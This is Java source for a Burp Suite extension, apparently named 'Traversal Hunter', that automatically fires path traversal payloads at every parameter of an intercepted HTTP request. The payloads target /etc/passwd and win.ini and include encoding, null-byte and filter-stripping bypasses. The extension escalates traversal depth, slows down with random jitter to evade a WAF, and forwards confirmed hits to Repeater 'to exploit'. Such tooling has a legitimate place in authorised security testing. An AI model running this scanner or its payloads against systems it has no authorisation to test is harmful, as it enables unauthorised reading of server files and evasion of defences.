import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.ParsedHttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.ui.contextmenu.ContextMenuEvent;
import burp.api.montoya.ui.contextmenu.ContextMenuItemsProvider;
import burp.api.montoya.ui.contextmenu.MessageEditorHttpRequestResponse;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.io.*;
import java.nio.file.*;
import java.util.*;
import java.util.List;
import java.util.concurrent.*;
import java.util.function.IntFunction;

public class TraversalHunter implements BurpExtension {

    private MontoyaApi api;
    private ExecutorService executor;
    private JTextArea logArea;
    private JTable resultsTable;
    private DefaultTableModel tableModel;
    private JSpinner depthSpinner;
    private JSpinner threadSpinner;
    private JSpinner delaySpinner;
    private JComboBox<String> modeCombo;
    private JProgressBar progressBar;
    private JLabel statusLabel;
    private JTextArea payloadArea;
    private volatile boolean isScanning = false;
    private volatile boolean stopRequested = false;
    private volatile HttpRequest lastInterceptedRequest = null;

    private static final int CRITICAL_THRESHOLD = 12;
    private static final int HIGH_THRESHOLD = 8;
    private static final int MEDIUM_THRESHOLD = 5;
    private static final int LOW_THRESHOLD = 3;

    private enum OpMode { STEALTH, BALANCED, AGGRESSIVE }
    private volatile OpMode currentMode = OpMode.BALANCED;

    private static final String[] BUILTIN_PAYLOADS = {
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
        "%252e%252e%252f%252e%252e%252fetc/passwd",
        "..;/..;/..;/etc/passwd",
        "../../../windows/win.ini",
        "....//....//....//windows/win.ini",
        "%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
        "../../../etc/passwd%00",
        "/etc/passwd",
        "C:\\\\windows\\\\win.ini",
        "..\\\\..\\\\..\\\\windows\\\\win.ini",
        "....\\\\....\\\\....\\\\windows\\\\win.ini",
        "../../../etc/passwd",
        "/etc/passwd",
        "....//....//....//etc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "/var/www/images/../../../etc/passwd",
        "../../../etc/passwd%00.png",
        "../../../etc/passwd%00.jpg",
    };

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;
        this.executor = Executors.newFixedThreadPool(1);

        api.extension().setName("📂Traversal Hunter - by egdarko");
        buildUI();

        api.userInterface().registerContextMenuItemsProvider(new ContextMenuItemsProvider() {
            @Override
            public List<Component> provideMenuItems(ContextMenuEvent event) {
                List<Component> items = new ArrayList<>();

                try {
                    List<HttpRequest> requestsToScan = new ArrayList<>();

                    if (!event.selectedRequestResponses().isEmpty()) {
                        event.selectedRequestResponses().forEach(rr -> {
                            if (rr.request() != null) {
                                requestsToScan.add(rr.request());
                            }
                        });
                    }

                    Optional<MessageEditorHttpRequestResponse> editorOpt = event.messageEditorRequestResponse();
                    if (editorOpt.isPresent()) {
                        MessageEditorHttpRequestResponse editor = editorOpt.get();
                        if (editor.requestResponse() != null && editor.requestResponse().request() != null) {
                            HttpRequest req = editor.requestResponse().request();
                            if (!requestsToScan.contains(req)) {
                                requestsToScan.add(req);
                            }
                        }
                    }

                    if (requestsToScan.isEmpty()) {
                        api.logging().logToOutput("[DEBUG] No requests found in context menu event");
                        return items;
                    }

                    api.logging().logToOutput("[DEBUG] Context menu: " + requestsToScan.size() + " request(s) found");

                    JMenuItem scanItem = new JMenuItem("Traversal Hunter Scan");
                    scanItem.addActionListener(e -> {
                        if (isScanning) {
                            log("Scan already running.");
                            return;
                        }
                        for (HttpRequest req : requestsToScan) {
                            lastInterceptedRequest = req;
                            startScan(req);
                        }
                    });
                    items.add(scanItem);

                    JMenuItem stopItem = new JMenuItem("Stop Scan");
                    stopItem.addActionListener(e -> {
                        stopRequested = true;
                        log("Stop requested...");
                    });
                    items.add(stopItem);

                } catch (Exception ex) {
                    api.logging().logToOutput("[ERROR] Context menu error: " + ex.getMessage());
                    ex.printStackTrace();
                }

                return items;
            }
        });

        api.http().registerHttpHandler(new burp.api.montoya.http.handler.HttpHandler() {
            @Override
            public burp.api.montoya.http.handler.RequestToBeSentAction handleHttpRequestToBeSent(
                    burp.api.montoya.http.handler.HttpRequestToBeSent requestToBeSent) {
                lastInterceptedRequest = requestToBeSent;
                return burp.api.montoya.http.handler.RequestToBeSentAction.continueWith(requestToBeSent);
            }

            @Override
            public burp.api.montoya.http.handler.ResponseReceivedAction handleHttpResponseReceived(
                    burp.api.montoya.http.handler.HttpResponseReceived responseReceived) {
                return burp.api.montoya.http.handler.ResponseReceivedAction.continueWith(responseReceived);
            }
        });

        api.logging().logToOutput("Traversal Hunter Loaded");
        api.logging().logToOutput("Right-click in ANY tabs: Proxy, Repeater, Logger, Target, Inspector");
    }

    private void buildUI() {
        JPanel mainPanel = new JPanel(new BorderLayout(5, 5));
        mainPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        JPanel controlPanel = new JPanel(new GridLayout(3, 1, 5, 5));

        JPanel row1 = new JPanel(new FlowLayout(FlowLayout.LEFT));
        depthSpinner = new JSpinner(new SpinnerNumberModel(10, 1, 25, 1));
        threadSpinner = new JSpinner(new SpinnerNumberModel(3, 1, 10, 1));
        delaySpinner = new JSpinner(new SpinnerNumberModel(200, 0, 2000, 50));

        row1.add(new JLabel("Max Depth:"));
        row1.add(depthSpinner);
        row1.add(new JLabel("Threads:"));
        row1.add(threadSpinner);
        row1.add(new JLabel("Delay (ms):"));
        row1.add(delaySpinner);

        JPanel row2 = new JPanel(new FlowLayout(FlowLayout.LEFT));
        modeCombo = new JComboBox<>(new String[]{"STEALTH", "BALANCED", "AGGRESSIVE", "HYBRID (Auto)"});
        modeCombo.setSelectedIndex(3);
        row2.add(new JLabel("Mode:"));
        row2.add(modeCombo);

        statusLabel = new JLabel("Status: IDLE");
        statusLabel.setForeground(Color.GRAY);
        row2.add(Box.createHorizontalStrut(20));
        row2.add(statusLabel);

        progressBar = new JProgressBar(0, 100);
        progressBar.setStringPainted(true);
        progressBar.setValue(0);
        row2.add(Box.createHorizontalStrut(20));
        row2.add(progressBar);

        JPanel row3 = new JPanel(new FlowLayout(FlowLayout.LEFT));

        JButton stopBtn = new JButton("STOP SCAN");
        stopBtn.setBackground(Color.RED);
        stopBtn.setForeground(Color.WHITE);
        stopBtn.setFocusPainted(false);
        stopBtn.addActionListener(e -> {
            if (isScanning) {
                stopRequested = true;
                log("Stop button clicked - stopping scan...");
            } else {
                log("No scan is currently running.");
            }
        });
        row3.add(stopBtn);
        row3.add(Box.createHorizontalStrut(10));

        JButton scanLastBtn = new JButton("Scan Last Request");
        scanLastBtn.setBackground(new Color(0, 120, 0));
        scanLastBtn.setForeground(Color.WHITE);
        scanLastBtn.setFocusPainted(false);
        scanLastBtn.setToolTipText("Scan the last request that passed through Burp Proxy");
        scanLastBtn.addActionListener(e -> {
            if (isScanning) {
                log("Scan already running.");
                return;
            }
            if (lastInterceptedRequest == null) {
                log("No intercepted request yet. Browse the target first.");
                return;
            }
            log("Scanning last intercepted request: " + getTargetUrl(lastInterceptedRequest));
            startScan(lastInterceptedRequest);
        });
        row3.add(scanLastBtn);

        controlPanel.add(row1);
        controlPanel.add(row2);
        controlPanel.add(row3);

        String[] columns = {"Confidence", "Payload", "Param/Strategy", "Score", "Status", "Length D", "Time D"};
        tableModel = new DefaultTableModel(columns, 0) {
            @Override public boolean isCellEditable(int row, int col) { return false; }
        };
        resultsTable = new JTable(tableModel);
        resultsTable.setAutoResizeMode(JTable.AUTO_RESIZE_ALL_COLUMNS);
        JScrollPane tableScroll = new JScrollPane(resultsTable);
        tableScroll.setPreferredSize(new Dimension(800, 120));

        JPanel payloadPanel = new JPanel(new BorderLayout());
        payloadPanel.setBorder(BorderFactory.createTitledBorder("Custom Payloads (one per line, # for comments)"));

        payloadArea = new JTextArea(10, 60);
        payloadArea.setFont(new Font(Font.MONOSPACED, Font.PLAIN, 11));

        StringBuilder defaultPayloads = new StringBuilder();
        for (String p : BUILTIN_PAYLOADS) {
            defaultPayloads.append(p).append("\n");
        }
        payloadArea.setText(defaultPayloads.toString().trim());

        JScrollPane payloadScroll = new JScrollPane(payloadArea);
        payloadPanel.add(payloadScroll, BorderLayout.CENTER);

        JPanel payloadButtons = new JPanel(new FlowLayout(FlowLayout.LEFT));
        JButton loadBtn = new JButton("Load from File");
        JButton saveBtn = new JButton("Save to File");
        JButton resetBtn = new JButton("Reset Defaults");

        loadBtn.addActionListener(e -> loadPayloadsFromFile());
        saveBtn.addActionListener(e -> savePayloadsToFile());
        resetBtn.addActionListener(e -> {
            StringBuilder sb = new StringBuilder();
            for (String p : BUILTIN_PAYLOADS) sb.append(p).append("\n");
            payloadArea.setText(sb.toString().trim());
        });

        payloadButtons.add(loadBtn);
        payloadButtons.add(saveBtn);
        payloadButtons.add(resetBtn);
        payloadPanel.add(payloadButtons, BorderLayout.SOUTH);

        JPanel centerPanel = new JPanel(new BorderLayout(5, 5));
        centerPanel.add(tableScroll, BorderLayout.NORTH);
        centerPanel.add(payloadPanel, BorderLayout.CENTER);

        logArea = new JTextArea(8, 80);
        logArea.setEditable(false);
        logArea.setFont(new Font(Font.MONOSPACED, Font.PLAIN, 11));
        JScrollPane logScroll = new JScrollPane(logArea);

        mainPanel.add(controlPanel, BorderLayout.NORTH);
        mainPanel.add(centerPanel, BorderLayout.CENTER);
        mainPanel.add(logScroll, BorderLayout.SOUTH);

        api.userInterface().registerSuiteTab("Traversal Hunter", mainPanel);
    }

    private void startScan(HttpRequest request) {
        int threads = (int) threadSpinner.getValue();

        if (executor != null && !executor.isShutdown()) {
            executor.shutdown();
        }
        executor = Executors.newFixedThreadPool(threads);

        executor.submit(() -> runAutonomousScan(request));
    }

    private void loadPayloadsFromFile() {
        JFileChooser chooser = new JFileChooser();
        chooser.setDialogTitle("Load Payloads");
        int result = chooser.showOpenDialog(null);
        if (result == JFileChooser.APPROVE_OPTION) {
            try {
                String content = new String(Files.readAllBytes(chooser.getSelectedFile().toPath()));
                payloadArea.setText(content);
                log("Loaded payloads from: " + chooser.getSelectedFile().getName());
            } catch (Exception e) {
                log("Error loading file: " + e.getMessage());
            }
        }
    }

    private void savePayloadsToFile() {
        JFileChooser chooser = new JFileChooser();
        chooser.setDialogTitle("Save Payloads");
        int result = chooser.showSaveDialog(null);
        if (result == JFileChooser.APPROVE_OPTION) {
            try {
                Files.write(chooser.getSelectedFile().toPath(), payloadArea.getText().getBytes());
                log("Saved payloads to: " + chooser.getSelectedFile().getName());
            } catch (Exception e) {
                log("Error saving file: " + e.getMessage());
            }
        }
    }

    private List<String> getPayloadsFromUI() {
        List<String> payloads = new ArrayList<>();
        String text = payloadArea.getText();
        for (String line : text.split("\n")) {
            line = line.trim();
            if (!line.isEmpty() && !line.startsWith("#")) {
                payloads.add(line);
            }
        }
        return payloads;
    }

    private String getTargetUrl(HttpRequest req) {
        if (req.httpService() != null) {
            return req.httpService().toString() + req.path();
        }
        String host = req.headerValue("Host");
        if (host != null) {
            return host + req.path();
        }
        return req.path();
    }

    private void runAutonomousScan(HttpRequest baseRequest) {
        isScanning = true;
        stopRequested = false;

        int maxDepth = (int) depthSpinner.getValue();
        int baseDelay = (int) delaySpinner.getValue();
        String selectedMode = (String) modeCombo.getSelectedItem();

        SwingUtilities.invokeLater(() -> {
            statusLabel.setText("Status: RECON");
            statusLabel.setForeground(Color.ORANGE);
            progressBar.setValue(0);
            tableModel.setRowCount(0);
        });

        try {
            log(separator());
            log("TRAVERAL HUNTER SCAN INITIATED");
            log("Settings -> Depth: " + maxDepth + " | Delay: " + baseDelay + "ms | Mode: " + selectedMode);

            String targetUrl = getTargetUrl(baseRequest);
            log("Target: " + targetUrl);

            List<ParsedHttpParameter> params = baseRequest.parameters();
            log("Parameters found: " + params.size());
            for (ParsedHttpParameter p : params) {
                log("  Param: " + p.name() + " = " + p.value() + " [" + p.type() + "]");
            }

            List<String> customPayloads = getPayloadsFromUI();
            log("Custom payloads loaded: " + customPayloads.size());
            log(separator());

            if (params.isEmpty()) {
                log("WARNING: No parameters found in request!");
                log("This extension tests parameters (URL, body, cookie).");
                log("If your target uses path segments, add a parameter in Repeater first.");
                return;
            }

            log("[PHASE 1] Baseline Profiling...");
            BaselineProfile baseline = captureBaseline(baseRequest);
            log("Baseline -> Status: " + baseline.status + " | Length: " + baseline.length + 
                " | Time: " + baseline.responseTime + "ms");
            updateProgress(5);

            log("[PHASE 2] Reflection Analysis...");
            ReflectionProfile reflection = analyzeReflection(baseRequest, baseline);
            log("Reflection -> Raw: " + reflection.rawReflection + " | Stripped: " + reflection.stripped);
            updateProgress(10);

            log("[PHASE 3] Filter Fingerprinting...");
            FilterProfile filter = fingerprintFilters(baseRequest, baseline);
            log("Filter -> Type: " + filter.filterType + " | Strength: " + filter.strength);
            updateProgress(20);

            if ("HYBRID (Auto)".equals(selectedMode)) {
                currentMode = selectMode(filter, baseline);
                log("Auto-selected mode: " + currentMode);
            } else {
                currentMode = OpMode.valueOf(selectedMode);
            }

            int adjustedDelay = adjustDelay(currentMode, baseDelay);
            log("Adjusted delay: " + adjustedDelay + "ms");

            log("[PHASE 4] Testing all parameters with all payloads...");

            ScanResult bestResult = null;
            int totalTests = params.size() * customPayloads.size();
            int testsDone = 0;

            for (ParsedHttpParameter targetParam : params) {
                if (stopRequested) break;

                log("Testing parameter: " + targetParam.name());

                for (String payload : customPayloads) {
                    if (stopRequested) break;

                    Thread.sleep(adjustedDelay + randomJitter(currentMode));

                    HttpRequest mutated = mutateSingleParameter(baseRequest, targetParam, payload);

                    long startTime = System.currentTimeMillis();
                    HttpResponse response = api.http().sendRequest(mutated).response();
                    long duration = System.currentTimeMillis() - startTime;

                    ScoreResult score = scoreResponse(response, baseline, duration, payload, "CUSTOM");
                    testsDone++;
                    updateProgress(20 + (testsDone * 75 / totalTests));

                    final int currentTest = testsDone;
                    final int total = totalTests;
                    SwingUtilities.invokeLater(() -> {
                        statusLabel.setText("Status: SCANNING | " + currentTest + "/" + total);
                    });

                    if (score.confidence != ConfidenceLevel.NONE) {
                        addResultRow(score, payload, targetParam.name(), 
                            response.body().length() - baseline.length,
                            (int)(duration - baseline.responseTime));

                        log(score.confidence.icon + " " + score.confidence + " - Score: " + 
                            score.totalScore + " | Param: " + targetParam.name() + 
                            " | Payload: " + payload);

                        if (score.confidence == ConfidenceLevel.CRITICAL || 
                            score.confidence == ConfidenceLevel.CONFIRMED) {
                            bestResult = new ScanResult(mutated, score, payload, targetParam.name());

                            if (score.confidence == ConfidenceLevel.CONFIRMED) {
                                log("CONFIRMED - Stopping scan");
                                break;
                            }
                        }
                    }

                    if (response.statusCode() == 403 || response.statusCode() == 429) {
                        log("WAF detected (" + response.statusCode() + ") - switching to STEALTH");
                        currentMode = OpMode.STEALTH;
                        adjustedDelay = adjustDelay(currentMode, baseDelay);
                        Thread.sleep(adjustedDelay * 3);
                    }
                }

                if (bestResult != null && bestResult.score.confidence == ConfidenceLevel.CONFIRMED) {
                    break;
                }
            }

            log("[PHASE 5] Adaptive depth escalation (max depth: " + maxDepth + ")...");

            List<MutationStrategy> strategies = selectStrategies(filter, reflection);

            for (MutationStrategy strategy : strategies) {
                if (stopRequested) break;
                if (bestResult != null && bestResult.score.confidence == ConfidenceLevel.CONFIRMED) break;

                log("Testing strategy: " + strategy.name);
                int escalationRate = 1;

                for (int depth = 1; depth <= maxDepth; depth += escalationRate) {
                    if (stopRequested) break;

                    String payload = strategy.generate(depth);
                    Thread.sleep(adjustedDelay + randomJitter(currentMode));

                    for (ParsedHttpParameter targetParam : params) {
                        if (stopRequested) break;

                        HttpRequest mutated = mutateSingleParameter(baseRequest, targetParam, payload);

                        long startTime = System.currentTimeMillis();
                        HttpResponse response = api.http().sendRequest(mutated).response();
                        long duration = System.currentTimeMillis() - startTime;

                        ScoreResult score = scoreResponse(response, baseline, duration, payload, strategy.name);

                        if (score.confidence != ConfidenceLevel.NONE) {
                            addResultRow(score, payload, strategy.name + "/" + targetParam.name(), 
                                response.body().length() - baseline.length,
                                (int)(duration - baseline.responseTime));

                            log(score.confidence.icon + " " + score.confidence + " - Score: " + 
                                score.totalScore + " | Payload: " + payload);

                            if (score.confidence == ConfidenceLevel.CRITICAL || 
                                score.confidence == ConfidenceLevel.CONFIRMED) {
                                bestResult = new ScanResult(mutated, score, payload, strategy.name);

                                if (score.confidence == ConfidenceLevel.CONFIRMED) {
                                    log("CONFIRMED - Stopping scan");
                                    break;
                                }
                            }
                        }
                    }

                    if (bestResult != null && bestResult.score.confidence == ConfidenceLevel.CONFIRMED) {
                        break;
                    }
                }
            }

            log("[PHASE 6] Final Analysis...");
            if (bestResult != null) {
                log(separator());
                log("BEST FINDING:");
                log("   Confidence: " + bestResult.score.confidence);
                log("   Score: " + bestResult.score.totalScore);
                log("   Strategy/Param: " + bestResult.strategy);
                log("   Payload: " + bestResult.payload);
                log(separator());

                api.repeater().sendToRepeater(bestResult.request, 
                    "Traversal-Hunter-AUTO-" + bestResult.score.confidence);

                final String popupMsg = "Vulnerability CONFIRMED!\n\n" +
                    "Payload: " + bestResult.payload + "\n" +
                    "Parameter: " + bestResult.strategy + "\n" +
                    "Score: " + bestResult.score.totalScore + "\n\n" +
                    "The request has been sent to Repeater.\n" +
                    "Check the Repeater tab to verify and exploit.";

                SwingUtilities.invokeLater(() -> {
                    statusLabel.setText("Status: CONFIRMED");
                    statusLabel.setForeground(new Color(0, 150, 0));

                    JOptionPane.showMessageDialog(
                        null,
                        popupMsg,
                        "Done - Vulnerability Found!",
                        JOptionPane.INFORMATION_MESSAGE
                    );
                });

                log("DONE - Request sent to Repeater. Check Repeater tab.");
            } else {
                log("No traversal vulnerability confirmed.");
                SwingUtilities.invokeLater(() -> {
                    statusLabel.setText("Status: COMPLETE - No findings");
                    statusLabel.setForeground(Color.GRAY);
                });
            }

            updateProgress(100);

        } catch (Exception e) {
            log("ERROR: " + e.getMessage());
            api.logging().logToOutput("[ERROR] " + e.getMessage());
            e.printStackTrace();
        } finally {
            isScanning = false;
            stopRequested = false;
        }
    }

    private HttpRequest mutateSingleParameter(HttpRequest req, ParsedHttpParameter targetParam, String payload) {
        List<HttpParameter> newParams = new ArrayList<>();
        for (ParsedHttpParameter p : req.parameters()) {
            if (p.name().equals(targetParam.name()) && p.type() == targetParam.type()) {
                newParams.add(createParameter(p.name(), payload, p.type()));
            } else {
                newParams.add(createParameter(p.name(), p.value(), p.type()));
            }
        }
        return req.withUpdatedParameters(newParams);
    }

    private String separator() {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 60; i++) sb.append("=");
        return sb.toString();
    }

    private BaselineProfile captureBaseline(HttpRequest request) throws Exception {
        long start = System.currentTimeMillis();
        HttpResponse response = api.http().sendRequest(request).response();
        long duration = System.currentTimeMillis() - start;

        return new BaselineProfile(
            response.statusCode(),
            response.body().length(),
            duration,
            response.bodyToString(),
            calculateEntropy(response.bodyToString())
        );
    }

    private ReflectionProfile analyzeReflection(HttpRequest baseRequest, BaselineProfile baseline) 
            throws Exception {
        String canary = "TRV" + (System.currentTimeMillis() % 10000) + "XYZ";

        List<HttpParameter> canaryParams = new ArrayList<>();
        for (ParsedHttpParameter p : baseRequest.parameters()) {
            canaryParams.add(createParameter(p.name(), canary, p.type()));
        }
        HttpRequest canaryRequest = baseRequest.withUpdatedParameters(canaryParams);
        HttpResponse canaryResponse = api.http().sendRequest(canaryRequest).response();
        String body = canaryResponse.bodyToString();

        boolean raw = body.contains(canary);
        boolean encoded = false;
        try {
            encoded = body.contains(java.net.URLEncoder.encode(canary, "UTF-8"));
        } catch (Exception e) {}
        boolean stripped = !raw && baseline.body.contains(canary);

        return new ReflectionProfile(raw, encoded, stripped);
    }

    private FilterProfile fingerprintFilters(HttpRequest baseRequest, BaselineProfile baseline) 
            throws Exception {

        String[][] probes = {
            {"../", "basic"},
            {"%2e%2e%2f", "single_decode"},
            {"%252e%252e%252f", "double_decode"},
            {"....//", "stripping"},
            {"..;/", "normalizing"}
        };

        String detectedFilter = "NONE";
        int strength = 0;

        for (String[] probe : probes) {
            String payload = probe[0];
            String type = probe[1];

            List<HttpParameter> testParams = new ArrayList<>();
            for (ParsedHttpParameter p : baseRequest.parameters()) {
                testParams.add(createParameter(p.name(), payload, p.type()));
            }
            HttpRequest testReq = baseRequest.withUpdatedParameters(testParams);
            HttpResponse testResp = api.http().sendRequest(testReq).response();

            String body = testResp.bodyToString();
            int lenDiff = Math.abs(testResp.body().length() - baseline.length);

            if (lenDiff > 50 || testResp.statusCode() != baseline.status) {
                strength++;
                if (type.equals("stripping") && !body.contains("../") && body.contains("//")) {
                    detectedFilter = "STRIPPING";
                } else if (type.equals("single_decode") && body.contains("../")) {
                    detectedFilter = "SINGLE_DECODE";
                } else if (type.equals("double_decode") && body.contains("../")) {
                    detectedFilter = "DOUBLE_DECODE";
                } else if (type.equals("normalizing") && testResp.statusCode() == 200) {
                    detectedFilter = "NORMALIZING";
                } else if (testResp.statusCode() == 403 || testResp.statusCode() == 429) {
                    detectedFilter = "WAF_BLOCK";
                    strength += 2;
                }
            }
        }

        return new FilterProfile(detectedFilter, strength);
    }

    private HttpParameter createParameter(String name, String value, HttpParameterType type) {
        if (type == HttpParameterType.URL) {
            return HttpParameter.urlParameter(name, value);
        } else if (type == HttpParameterType.BODY) {
            return HttpParameter.bodyParameter(name, value);
        } else if (type == HttpParameterType.COOKIE) {
            return HttpParameter.cookieParameter(name, value);
        } else {
            return HttpParameter.urlParameter(name, value);
        }
    }

    private OpMode selectMode(FilterProfile filter, BaselineProfile baseline) {
        if (filter.filterType.equals("WAF_BLOCK") || filter.strength >= 3) {
            return OpMode.STEALTH;
        } else if (filter.filterType.equals("NONE") || filter.strength == 0) {
            return OpMode.AGGRESSIVE;
        }
        return OpMode.BALANCED;
    }

    private int adjustDelay(OpMode mode, int baseDelay) {
        switch (mode) {
            case STEALTH: return Math.max(baseDelay * 3, 500);
            case BALANCED: return baseDelay;
            case AGGRESSIVE: return Math.max(baseDelay / 2, 50);
            default: return baseDelay;
        }
    }

    private int randomJitter(OpMode mode) {
        Random rand = new Random();
        switch (mode) {
            case STEALTH: return rand.nextInt(400) + 100;
            case BALANCED: return rand.nextInt(200);
            case AGGRESSIVE: return rand.nextInt(50);
            default: return rand.nextInt(100);
        }
    }

    private List<MutationStrategy> selectStrategies(FilterProfile filter, ReflectionProfile reflection) {
        List<MutationStrategy> strategies = new ArrayList<>();

        strategies.add(new MutationStrategy("BASIC", "Standard traversal", 
            d -> repeatString("../", d) + "etc/passwd"));

        if (filter.filterType.equals("STRIPPING") || filter.filterType.equals("NONE")) {
            strategies.add(new MutationStrategy("DOT_OVERFLOW", "Stripping bypass",
                d -> repeatString("....//", d) + "etc/passwd"));
        }

        if (filter.filterType.equals("SINGLE_DECODE") || filter.filterType.equals("NONE")) {
            strategies.add(new MutationStrategy("URL_ENCODE", "Single URL encoding",
                d -> repeatString("%2e%2e%2f", d) + "etc/passwd"));
        }

        if (filter.filterType.equals("DOUBLE_DECODE") || filter.filterType.equals("NONE")) {
            strategies.add(new MutationStrategy("DOUBLE_ENCODE", "Double URL encoding",
                d -> repeatString("%252e%252e%252f", d) + "etc/passwd"));
        }

        strategies.add(new MutationStrategy("WINDOWS", "Windows path",
            d -> repeatString("..\\", d) + "windows\\win.ini"));
        strategies.add(new MutationStrategy("ABSOLUTE", "Absolute path",
            d -> "/etc/passwd"));

        return strategies;
    }

    private String repeatString(String s, int times) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < times; i++) sb.append(s);
        return sb.toString();
    }

    private ScoreResult scoreResponse(HttpResponse response, BaselineProfile baseline, 
                                       long duration, String payload, String strategy) {
        String body = response.bodyToString();
        int score = 0;
        List<String> indicators = new ArrayList<>();

        if (body.contains("root:x:")) { score += 6; indicators.add("root:x:"); }
        if (body.contains("daemon:")) { score += 3; indicators.add("daemon:"); }
        if (body.contains("/bin/bash")) { score += 3; indicators.add("/bin/bash"); }
        if (body.contains("[extensions]")) { score += 5; indicators.add("[extensions]"); }
        if (body.contains("boot loader")) { score += 3; indicators.add("boot loader"); }
        if (body.contains("[fonts]")) { score += 3; indicators.add("[fonts]"); }

        int lenDiff = Math.abs(response.body().length() - baseline.length);
        if (lenDiff > 200) { score += 3; indicators.add("large_len_diff"); }
        else if (lenDiff > 80) { score += 2; indicators.add("medium_len_diff"); }
        else if (lenDiff > 30) { score += 1; indicators.add("small_len_diff"); }

        if (response.statusCode() != baseline.status) {
            if (response.statusCode() == 200 && baseline.status != 200) {
                score += 3; indicators.add("status_200");
            } else if (response.statusCode() == 500) {
                score += 2; indicators.add("status_500");
            }
        }

        long timeDiff = duration - baseline.responseTime;
        if (timeDiff > 1000) { score += 3; indicators.add("timing_high"); }
        else if (timeDiff > 500) { score += 2; indicators.add("timing_med"); }
        else if (timeDiff > 200) { score += 1; indicators.add("timing_low"); }

        if (body.contains("No such file") || body.contains("not found")) {
            score += 2; indicators.add("file_error");
        }
        if (body.contains("Permission denied")) {
            score += 3; indicators.add("perm_denied");
        }

        double bodyEntropy = calculateEntropy(body);
        double entropyDiff = Math.abs(bodyEntropy - baseline.entropy);
        if (entropyDiff > 1.0) { score += 2; indicators.add("entropy_shift"); }

        ConfidenceLevel confidence;
        if (score >= CRITICAL_THRESHOLD) confidence = ConfidenceLevel.CONFIRMED;
        else if (score >= HIGH_THRESHOLD) confidence = ConfidenceLevel.CRITICAL;
        else if (score >= MEDIUM_THRESHOLD) confidence = ConfidenceLevel.HIGH;
        else if (score >= LOW_THRESHOLD) confidence = ConfidenceLevel.MEDIUM;
        else if (score > 0) confidence = ConfidenceLevel.LOW;
        else confidence = ConfidenceLevel.NONE;

        return new ScoreResult(score, confidence, indicators, response.statusCode());
    }

    private double calculateEntropy(String text) {
        if (text == null || text.isEmpty()) return 0;
        Map<Character, Integer> freq = new HashMap<>();
        for (char c : text.toCharArray()) {
            freq.put(c, freq.getOrDefault(c, 0) + 1);
        }
        double entropy = 0;
        int len = text.length();
        for (int count : freq.values()) {
            double p = (double) count / len;
            entropy -= p * (Math.log(p) / Math.log(2));
        }
        return entropy;
    }

    private void addResultRow(ScoreResult score, String payload, String strategy, 
                               int lenDelta, int timeDelta) {
        SwingUtilities.invokeLater(() -> {
            String payloadShort = payload.length() > 50 ? payload.substring(0, 50) + "..." : payload;
            String lenStr = lenDelta > 0 ? "+" + lenDelta : String.valueOf(lenDelta);
            String timeStr = timeDelta > 0 ? "+" + timeDelta + "ms" : timeDelta + "ms";
            tableModel.addRow(new Object[]{
                score.confidence.toString(),
                payloadShort,
                strategy,
                score.totalScore,
                score.statusCode,
                lenStr,
                timeStr
            });
        });
    }

    private void updateProgress(int value) {
        SwingUtilities.invokeLater(() -> progressBar.setValue(Math.min(value, 100)));
    }

    private void log(String msg) {
        SwingUtilities.invokeLater(() -> {
            String time = new java.text.SimpleDateFormat("HH:mm:ss").format(new Date());
            logArea.append("[" + time + "] " + msg + "\n");
            logArea.setCaretPosition(logArea.getDocument().getLength());
        });
    }

    static class BaselineProfile {
        int status; int length; long responseTime; String body; double entropy;
        BaselineProfile(int s, int l, long t, String b, double e) {
            status = s; length = l; responseTime = t; body = b; entropy = e;
        }
    }

    static class ReflectionProfile {
        boolean rawReflection, encodedReflection, stripped;
        ReflectionProfile(boolean r, boolean e, boolean s) {
            rawReflection = r; encodedReflection = e; stripped = s;
        }
    }

    static class FilterProfile {
        String filterType; int strength;
        FilterProfile(String f, int s) { filterType = f; strength = s; }
    }

    static class MutationStrategy {
        String name, description;
        IntFunction<String> generator;
        MutationStrategy(String n, String d, IntFunction<String> g) {
            name = n; description = d; generator = g;
        }
        String generate(int depth) { return generator.apply(depth); }
    }

    static class ScoreResult {
        int totalScore; ConfidenceLevel confidence; List<String> indicators; int statusCode;
        ScoreResult(int s, ConfidenceLevel c, List<String> i, int code) {
            totalScore = s; confidence = c; indicators = i; statusCode = code;
        }
    }

    static class ScanResult {
        HttpRequest request; ScoreResult score; String payload, strategy;
        ScanResult(HttpRequest r, ScoreResult s, String p, String st) {
            request = r; score = s; payload = p; strategy = st;
        }
    }

    enum ConfidenceLevel {
        NONE("", ""), LOW("LOW", "[L]"), MEDIUM("MEDIUM", "[M]"), 
        HIGH("HIGH", "[H]"), CRITICAL("CRITICAL", "[C]"), CONFIRMED("CONFIRMED", "[OK]");
        String label, icon;
        ConfidenceLevel(String l, String i) { label = l; icon = i; }
        public String toString() { return icon + " " + label; }
    }
}
